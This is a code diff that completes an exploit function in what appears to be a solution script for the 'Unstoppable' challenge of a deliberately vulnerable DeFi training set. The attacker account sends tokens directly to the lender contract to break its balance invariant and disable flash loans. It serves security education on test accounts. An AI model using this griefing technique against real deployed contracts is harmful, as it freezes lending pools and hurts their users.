@@ -38,8 +38,15 @@ def before():
 def run_exploit():
     # remove pass and add exploit code here
     # attacker = accounts[1] - account to be used for exploit
-    pass
+    deployer = accounts[0]
+    attacker = accounts[1]
+    randomUser = accounts[2]
+    dvt_token = DamnValuableToken[-1]
+    lender = UnstoppableLender[-1]
 
+    amount = Web3.toWei("50", "ether")
+    # direct transfer from attacker to lender contract to create the imbalance between poolBalance and balanceBefore
+    dvt_token.transfer(lender, amount, {'from': attacker})
 
 def after():
     randomUser = accounts[2]
